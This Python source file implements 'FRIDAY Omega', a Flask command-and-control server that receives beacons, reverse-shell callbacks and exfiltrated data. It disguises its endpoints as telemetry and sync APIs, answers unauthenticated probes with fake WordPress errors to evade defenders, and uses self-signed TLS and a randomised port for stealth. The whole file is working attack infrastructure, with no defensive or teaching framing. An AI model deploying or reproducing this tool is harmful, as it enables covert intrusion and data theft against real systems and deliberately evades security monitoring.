"""
FRIDAY Omega — OOB (Out-of-Band) Persistence Server (HARDENED C2)
A hardened Flask listener for reverse callbacks, blind HTTP hits, and beaconing.
Features: TLS Encryption, Randomized Port, Token Auth, Traffic Mimicry.
"""
import logging
import sys
import os
import threading
import json
import random
from datetime import datetime

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from flask import Flask, request, jsonify

app = Flask(__name__)
app.config['JSONIFY_PRETTYPRINT_REGULAR'] = True

# SECURITY CONFIGURATION
AUTH_TOKEN = os.getenv("OOB_AUTH_TOKEN", "FRIDAY-OMEGA-7734")
C2_PORT = random.randint(8000, 9999) 

callback_log = []

@app.before_request
def require_auth():
    """Enforce token authentication on all C2 endpoints to prevent Blue Team probing."""
    # Allow local log viewing without token
    if request.path == '/log' and request.remote_addr == '127.0.0.1':
        return
        
    client_token = request.headers.get("X-Auth-Token", "")
    if client_token != AUTH_TOKEN:
        logging.warning(f"[OOB-SERVER] Unauthorized probe detected from {request.remote_addr}. Active defense triggered.")
        # Traffic mimicry: pretend to be a broken WordPress API
        return jsonify({"error": "wp-json api namespace not found", "code": "rest_no_route"}), 404

@app.route('/api/v2/telemetry', methods=['POST', 'GET'])
def beacon():
    """Stealth beacon entry point (disguised as telemetry endpoint)."""
    data = request.args.to_dict() if request.method == 'GET' else request.get_json(silent=True) or {}
    source_ip = request.remote_addr
    timestamp = datetime.now().isoformat()
    
    entry = {"type": "beacon", "source": source_ip, "data": data, "time": timestamp}
    callback_log.append(entry)
    logging.info(f"[OOB-SERVER] Authenticated Beacon from {source_ip}")
    
    # Traffic mimicry response
    return {"status": "telemetry_logged", "session_id": len(callback_log)}

@app.route('/api/v2/sync', methods=['POST'])
def callback():
    """Stealth reverse shell / Data exfiltration endpoint."""
    raw_data = request.data.decode('utf-8', errors='replace')
    source_ip = request.remote_addr
    timestamp = datetime.now().isoformat()
    
    entry = {"type": "callback", "source": source_ip, "data": raw_data[:5000], "time": timestamp}
    callback_log.append(entry)
    logging.info(f"[OOB-SERVER] Exfil data received from {source_ip}: {raw_data[:100]}...")
    
    return {"status": "sync_complete", "bytes_synced": len(raw_data)}

@app.route('/log', methods=['GET'])
def view_log():
    """View all received callbacks (Operator UI)."""
    return {"total": len(callback_log), "ops_token": AUTH_TOKEN, "entries": callback_log[-50:]}

def start_oob_server(background=True):
    """
    Start the hardened OOB persistence listener.
    Uses 'adhoc' SSL context to auto-generate self-signed certs for HTTPS evasion.
    """
    logging.info(f"[OOB-SERVER] Initializing Hardened C2 Server...")
    logging.info(f"[OOB-SERVER] Port: {C2_PORT} | Token: {AUTH_TOKEN[:4]}**** | TLS: Enabled")
    
    try:
        # Requires pyopenssl installed, otherwise drops back to HTTP
        import OpenSSL
        ssl_ctx = 'adhoc'
    except ImportError:
        logging.warning("[OOB-SERVER] pyopenssl not found. TLS disabled. C2 operating in plaintext.")
        ssl_ctx = None

    if background:
        server_thread = threading.Thread(
            target=lambda: app.run(host='0.0.0.0', port=C2_PORT, ssl_context=ssl_ctx, debug=False, use_reloader=False),
            daemon=True
        )
        server_thread.start()
        return f"OOB Server LIVE -> https://0.0.0.0:{C2_PORT}"
    else:
        app.run(host='0.0.0.0', port=C2_PORT, ssl_context=ssl_ctx, debug=False)
        return "OOB Server stopped."

if __name__ == "__main__":
    start_oob_server(background=False)
